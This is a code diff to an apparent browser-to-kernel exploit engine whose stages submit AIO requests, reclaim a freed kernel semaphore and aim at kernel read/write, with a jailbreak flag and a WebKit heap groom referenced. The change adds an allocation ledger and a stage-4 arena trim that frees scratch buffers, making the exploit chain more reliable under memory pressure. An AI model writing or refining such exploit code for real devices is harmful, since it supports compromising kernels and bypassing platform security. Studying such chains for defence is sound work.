@@ -195,6 +195,9 @@ export function makeBagagwaEngine(X) {
         kernelWrites: 0,
         jailbroken: false,
         aliasesRepaired: false,
+
+        // [OOM-fix] engine allocation ledger for the stage-4 trim.
+        allocs: [],
     };
 
     function alloc(size, label) {
@@ -209,7 +212,9 @@ export function makeBagagwaEngine(X) {
         // NOTE: backing is already pinned in P.nogc by P.malloc — do NOT
         // push the u8 view too (was doubling nogc growth -> JSC OOM
         // right after PAIR-RELEASE/settle on tight arenas).
-        return { base: ptr, u8, bytes: size, label };
+        const h = { base: ptr, u8, bytes: size, label, keep: false };
+        S.allocs.push(h);
+        return h;
     }
 
     // OOM-resilient alloc: P.malloc (new Uint8Array in main.js) throws
@@ -231,6 +236,36 @@ export function makeBagagwaEngine(X) {
                 return null;
             }
         }
+    }
+
+    // [OOM-fix] Stage-4 arena trim. The engine's userland buffers are tiny
+    // compared to the WebKit groom (~110MB/attempt in core.js), but on a
+    // tight post-promotion arena every pinned page counts. At stage-4 begin
+    // we release every engine buffer that is provably dead: probe buffers,
+    // wait-id/timeout scratch, lapse-probe scratch. Buffers the kernel still
+    // targets (aio-data read target, request structs alive until cleanup)
+    // are marked keep=true and never released here.
+    function trimArena(label) {
+        const RELEASE_PATTERNS = [
+            /^probe-/, /^aio-wait-ids$/, /^aio-mw-timeout$/, /^lapse-/, /^dummy-/,
+        ];
+        let freed = 0, count = 0;
+        try {
+            for (const h of S.allocs) {
+                if (h.keep) continue;
+                if (!RELEASE_PATTERNS.some((re) => re.test(h.label || ""))) continue;
+                const b = h.base && h.base.backing;
+                if (b && Array.isArray(P.nogc)) {
+                    const i = P.nogc.indexOf(b);
+                    if (i >= 0) { P.nogc.splice(i, 1); freed += (b.byteLength || 0); count++; }
+                }
+                h.released = true;
+            }
+            S.allocs = S.allocs.filter((h) => h.keep || !h.released);
+        } catch (_) { }
+        try { if (typeof globalThis.gc === "function") globalThis.gc(); } catch (_) { }
+        note("[trim] " + label + ": released " + count + " dead buffers (" + freed + "B)" +
+            " — kernel-stage buffers marked keep stay pinned");
     }
 
     async function submitAioRequest(fd, buf, size, offset) {
@@ -991,6 +1026,7 @@ export function makeBagagwaEngine(X) {
         const num = o.numRequests || 2;
         const dataBuf = safeAlloc(64, "aio-data");
         if (!dataBuf) { out.why = "aio-data buffer OOM (arena exhausted)"; return out; }
+        dataBuf.keep = true; // kernel AIO read target — must survive until the wake
         for (let i = 0; i < num; i++) {
             note("[S0-2." + i + "] aio_submit(req,1) fd=" + S.aioRfd);
             const sr = await submitAioRequest(S.aioRfd, dataBuf.base, 64,
@@ -1407,6 +1443,12 @@ export function makeBagagwaEngine(X) {
         const out = { ok: false, why: "", steps: [], rw: false };
 
         note("=== Stage 4: reclaim freed osem + establish kernel R/W ===");
+
+        // [OOM-fix] stage-4-begin arena trim: release probe/scratch buffers
+        // that are provably dead before the kqueue/curproc walks allocate.
+        // Only runs HERE (stage 4 trigger), per the chain design — earlier
+        // stages may still reference their scratch buffers.
+        try { trimArena("stage4-begin"); } catch (_) { }
 
         if (!S.fdOfiles && !S.masterPipeData && S.leakedAddrs.length === 0) {
             note("NOTE: no kernel read primitive yet (fdOfiles=null, masterPipeData=null, "
